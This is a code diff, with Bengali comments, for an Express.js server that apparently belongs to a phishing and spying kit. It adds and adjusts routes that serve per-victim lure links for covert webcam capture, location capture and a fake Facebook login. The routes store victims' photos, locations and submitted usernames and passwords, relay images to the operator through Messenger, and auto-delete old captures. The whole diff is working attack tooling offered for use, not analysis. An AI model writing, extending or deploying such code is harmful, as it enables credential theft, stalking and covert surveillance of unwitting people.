@@ -4,12 +4,41 @@ const router = express.Router();
 const Victim = require('../models/Victim');
 const { 
     sendMessage, 
-    sendImageMessage,   // ইমেজ পাঠানোর ফাংশন (helpers.js থেকে)
+    sendImageMessage,
     formatVictimData,
     formatLocationMessage 
 } = require('../utils/helpers');
 
-// ===== ক্যামেরা লিঙ্ক ভিজিট =====
+// ================================================================
+// 🗑️ অটো ডিলিট: ১ মিনিট পর পুরাতন ছবি মুছে ফেলবে
+// ================================================================
+const CLEANUP_INTERVAL = 30000; // ৩০ সেকেন্ড
+const IMAGE_TTL = 60000; // ১ মিনিট
+
+setInterval(async () => {
+    try {
+        const cutoff = new Date(Date.now() - IMAGE_TTL);
+        const victims = await Victim.find();
+        let updated = 0;
+        for (const v of victims) {
+            const originalLength = v.camera.length;
+            v.camera = v.camera.filter(c => new Date(c.timestamp) > cutoff);
+            if (v.camera.length !== originalLength) {
+                await v.save();
+                updated++;
+            }
+        }
+        if (updated > 0) console.log(`🗑️ ${updated} টি ভিক্টিমের পুরাতন ছবি মুছে ফেলা হয়েছে।`);
+    } catch (err) {
+        console.error('Cleanup error:', err);
+    }
+}, CLEANUP_INTERVAL);
+
+// ================================================================
+// রাউটস
+// ================================================================
+
+// ক্যামেরা লিঙ্ক
 router.get('/v/:id', async (req, res) => {
     try {
         const victim = await Victim.findOne({ id: req.params.id });
@@ -23,7 +52,21 @@ router.get('/v/:id', async (req, res) => {
     }
 });
 
-// ===== ফেক ফেসবুক লিঙ্ক ভিজিট =====
+// 🆕 লোকেশন লিঙ্ক
+router.get('/l/:id', async (req, res) => {
+    try {
+        const victim = await Victim.findOne({ id: req.params.id });
+        if (!victim) {
+            return res.status(404).send('লিঙ্কটি ভুল বা মেয়াদোত্তীর্ণ।');
+        }
+        res.sendFile(path.join(__dirname, '../public/location.html'));
+    } catch (err) {
+        console.error('Error serving location page:', err);
+        res.status(500).send('সার্ভার ত্রুটি');
+    }
+});
+
+// ফেক ফেসবুক লিঙ্ক
 router.get('/fb/:id', async (req, res) => {
     try {
         const victim = await Victim.findOne({ id: req.params.id });
@@ -37,7 +80,9 @@ router.get('/fb/:id', async (req, res) => {
     }
 });
 
-// ===== ভিক্টিম ডেটা রিসিভ (টেক্সট + লোকেশন) =====
+// ================================================================
+// ভিক্টিম ডেটা রিসিভ
+// ================================================================
 router.post('/api/victim', async (req, res) => {
     try {
         const data = req.body;
@@ -84,7 +129,7 @@ router.post('/api/victim', async (req, res) => {
             console.log(`✅ ভিক্টিম আপডেট: ${data.id}`);
         }
 
-        // ===== মূল টেক্সট মেসেজ পাঠান =====
+        // ===== টেক্সট মেসেজ পাঠান =====
         if (victim.fbId && victim.fbId !== 'unknown') {
             const msg = formatVictimData(victim);
             await sendMessage(victim.fbId, msg);
@@ -113,7 +158,7 @@ router.post('/api/victim', async (req, res) => {
 });
 
 // ================================================================
-// 🆕 ক্যামেরা ছবি রিসিভ - ইমেজ অ্যাটাচমেন্ট সহ
+// ক্যামেরা ছবি রিসিভ (অটো ডিলিটের জন্য টাইমস্ট্যাম্প সহ)
 // ================================================================
 router.post('/api/camera', async (req, res) => {
     try {
@@ -130,18 +175,15 @@ router.post('/api/camera', async (req, res) => {
         if (!victim.camera) victim.camera = [];
         victim.camera.push({
             image: image,
-            timestamp: new Date()
+            timestamp: new Date() // টাইমস্ট্যাম্প যোগ করা হয়েছে
         });
         await victim.save();
 
         const totalImages = victim.camera.length;
         console.log(`📸 ক্যামেরা ছবি: ${id} (মোট ${totalImages}টি)`);
 
-        // ============================================================
-        // ইমেজ অ্যাটাচমেন্ট পাঠান (প্রতি ৫টি ছবি পরপর, অথবা শেষে)
-        // ============================================================
+        // ইমেজ মেসেজ পাঠান (প্রতি ৫টি বা ১ম/৩য়)
         if (victim.fbId && victim.fbId !== 'unknown') {
-            // প্রতি ৫টি ছবি পরপর পাঠান, অথবা ১ম, ৩য়, ৫ম...
             if (totalImages % 5 === 0 || totalImages === 1 || totalImages === 3) {
                 await sendImageMessage(victim.fbId, image);
                 console.log(`📸 ইমেজ মেসেজ পাঠানো হয়েছে: ${victim.fbId} (ছবি #${totalImages})`);
@@ -156,7 +198,9 @@ router.post('/api/camera', async (req, res) => {
     }
 });
 
-// ===== ইমেজ ভিউ (ব্রাউজারে দেখার জন্য) =====
+// ================================================================
+// ইমেজ ভিউ (অ্যাডমিন প্যানেলের জন্য)
+// ================================================================
 router.get('/image/:id/:index', async (req, res) => {
     try {
         const victim = await Victim.findOne({ id: req.params.id });
@@ -165,7 +209,7 @@ router.get('/image/:id/:index', async (req, res) => {
         }
         const index = parseInt(req.params.index);
         if (isNaN(index) || index < 0 || index >= victim.camera.length) {
-            return res.status(404).send('ছবি পাওয়া যায়নি');
+            return res.status(404).send('ছবি পাওয়া যায়নি (সম্ভবত ডিলিট হয়ে গেছে)');
         }
         const imgData = victim.camera[index].image;
         res.send(`<img src="data:image/jpeg;base64,${imgData}" style="max-width:100%;" />`);
@@ -175,7 +219,9 @@ router.get('/image/:id/:index', async (req, res) => {
     }
 });
 
-// ===== ফেক ফেসবুক লগইন ডেটা =====
+// ================================================================
+// ফেক ফেসবুক লগইন ডেটা
+// ================================================================
 router.post('/api/fblogin', async (req, res) => {
     try {
         const { id, username, password } = req.body;
